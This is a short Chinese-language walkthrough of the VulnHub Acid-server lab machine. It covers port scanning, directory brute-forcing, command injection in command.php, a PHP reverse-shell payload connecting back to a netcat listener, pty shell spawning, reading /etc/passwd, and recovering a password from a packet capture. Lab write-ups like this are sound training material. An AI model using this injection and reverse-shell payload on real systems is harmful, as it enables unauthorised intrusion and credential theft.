# VulnHub: Acid-server
- https://www.vulnhub.com/entry/acid-server,125/

## Walkthrough
nmap掃描虛擬機ip及port，發現位於33447/tcp是開啟狀態，service為http  
`$ sudo nmap -sP 172.16.71.0/24`  
`$ sudo nmap -p1-65535 -sV 172.16.71.208`

利用DirBuster暴力掃目錄，從cake.php中找出/Magic_Box，掃/Magic_Box，發現command.php  
首先ping172.16.71.1;id發現命令成功注入，嘗試獲取shell，監聽3333port  
`$ nc -l 3333`  
用php反彈shell成功，最後payload:  
`172.16.71.1; php-r '$sock=fsockopen("172.16.71.1",3333);exec("/bin/sh-i<&3 >&3 2>&3");'`  
發現su指令無法執行，出現錯誤訊息su:must be run from a terminal，用python調用本地shell  
`$ python -c 'import pty;pty.spawn("/bin/bash")'`  

查找用戶，發現三個可疑帳號acid、saman、root，嘗試找尋用戶的可疑文件  
`$ cat /etc/passwd`  
`$ find / -user acid 2>/dev/null`  
發現pcapng可疑流量檔案，下載回本地查看  

利用wireshark打開hint.pcapng，找到saman密碼1337hax0r  
利用find找到flag.txt，成功！
